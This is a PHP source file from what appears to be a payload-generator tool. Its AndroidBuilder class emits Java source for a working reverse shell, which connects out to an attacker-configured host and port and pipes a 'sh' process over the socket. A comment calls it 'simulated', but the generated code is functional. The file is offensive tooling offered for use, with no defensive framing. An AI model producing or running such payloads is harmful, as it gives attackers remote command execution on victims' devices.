<?php
namespace App\Modules\PayloadGenerator;

class AndroidBuilder extends Builder
{
    public function generate(): string
    {
        // For Android, we generate a small Java reverse shell (simulated)
        $payload = "// Android reverse shell stub\n" .
                   "import java.net.Socket;\n" .
                   "import java.io.*;\n" .
                   "public class RevShell {\n" .
                   "  public static void main(String[] args) throws Exception {\n" .
                   "    Socket s = new Socket(\"{$this->lhost}\", {$this->lport});\n" .
                   "    Process p = Runtime.getRuntime().exec(\"sh\");\n" .
                   "    new Thread(new Runnable(){public void run(){try{byte[] b=new byte[1024];int r;while((r=s.getInputStream().read(b))!=-1){p.getOutputStream().write(b,0,r);}}catch(Exception e){}}}).start();\n" .
                   "    new Thread(new Runnable(){public void run(){try{byte[] b=new byte[1024];int r;while((r=p.getInputStream().read(b))!=-1){s.getOutputStream().write(b,0,r);}}catch(Exception e){}}}).start();\n" .
                   "  }\n" .
                   "}\n";
        return $payload;
    }

    public function getFileExtension(): string { return 'java'; }
    public function getMimeType(): string { return 'text/x-java-source'; }
}
